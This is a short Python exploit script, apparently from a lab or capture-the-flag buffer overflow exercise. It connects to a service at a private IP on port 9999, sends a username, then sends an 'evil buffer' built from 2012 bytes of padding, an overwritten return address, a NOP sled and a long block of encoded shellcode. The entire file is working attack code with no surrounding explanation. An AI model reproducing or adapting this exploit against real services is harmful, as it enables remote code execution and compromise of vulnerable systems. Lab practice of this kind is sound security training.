import socket

ip = "10.10.121.39"
port = 9999
timeout = 5
username ="0xdigimon"

prefix = ""
offset = 2012
overflow = "A" * offset
retn = "\x1b\x15\x50\x62" #6250151B
padding = "\x90"*16
payload = ("\xdb\xd6\xd9\x74\x24\xf4\x58\xbf\xd3\xb5\x75\xee\x29\xc9"
"\xb1\x52\x83\xc0\x04\x31\x78\x13\x03\xab\xa6\x97\x1b\xb7"
"\x21\xd5\xe4\x47\xb2\xba\x6d\xa2\x83\xfa\x0a\xa7\xb4\xca"
"\x59\xe5\x38\xa0\x0c\x1d\xca\xc4\x98\x12\x7b\x62\xff\x1d"
"\x7c\xdf\xc3\x3c\xfe\x22\x10\x9e\x3f\xed\x65\xdf\x78\x10"
"\x87\x8d\xd1\x5e\x3a\x21\x55\x2a\x87\xca\x25\xba\x8f\x2f"
"\xfd\xbd\xbe\xfe\x75\xe4\x60\x01\x59\x9c\x28\x19\xbe\x99"
"\xe3\x92\x74\x55\xf2\x72\x45\x96\x59\xbb\x69\x65\xa3\xfc"
"\x4e\x96\xd6\xf4\xac\x2b\xe1\xc3\xcf\xf7\x64\xd7\x68\x73"
"\xde\x33\x88\x50\xb9\xb0\x86\x1d\xcd\x9e\x8a\xa0\x02\x95"
"\xb7\x29\xa5\x79\x3e\x69\x82\x5d\x1a\x29\xab\xc4\xc6\x9c"
"\xd4\x16\xa9\x41\x71\x5d\x44\x95\x08\x3c\x01\x5a\x21\xbe"
"\xd1\xf4\x32\xcd\xe3\x5b\xe9\x59\x48\x13\x37\x9e\xaf\x0e"
"\x8f\x30\x4e\xb1\xf0\x19\x95\xe5\xa0\x31\x3c\x86\x2a\xc1"
"\xc1\x53\xfc\x91\x6d\x0c\xbd\x41\xce\xfc\x55\x8b\xc1\x23"
"\x45\xb4\x0b\x4c\xec\x4f\xdc\x79\xff\x76\x53\x16\xfd\x88"
"\x6a\x5b\x88\x6e\x06\xb3\xdd\x39\xbf\x2a\x44\xb1\x5e\xb2"
"\x52\xbc\x61\x38\x51\x41\x2f\xc9\x1c\x51\xd8\x39\x6b\x0b"
"\x4f\x45\x41\x23\x13\xd4\x0e\xb3\x5a\xc5\x98\xe4\x0b\x3b"
"\xd1\x60\xa6\x62\x4b\x96\x3b\xf2\xb4\x12\xe0\xc7\x3b\x9b"
"\x65\x73\x18\x8b\xb3\x7c\x24\xff\x6b\x2b\xf2\xa9\xcd\x85"
"\xb4\x03\x84\x7a\x1f\xc3\x51\xb1\xa0\x95\x5d\x9c\x56\x79"
"\xef\x49\x2f\x86\xc0\x1d\xa7\xff\x3c\xbe\x48\x2a\x85\xde"
"\xaa\xfe\xf0\x76\x73\x6b\xb9\x1a\x84\x46\xfe\x22\x07\x62"
"\x7f\xd1\x17\x07\x7a\x9d\x9f\xf4\xf6\x8e\x75\xfa\xa5\xaf"
"\x5f")
postfix = ""

buffer = prefix + overflow + retn + padding + payload + postfix

d = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

try:
    d.connect((ip, port))
    d.recv(1024)
    d.send(bytes(username, "latin-1"))
    d.recv(1024)
    print("Sending evil buffer...")
    d.send(bytes(buffer + "\r\n", "latin-1"))
    print("Done!")
except:
    print("Could not connect.")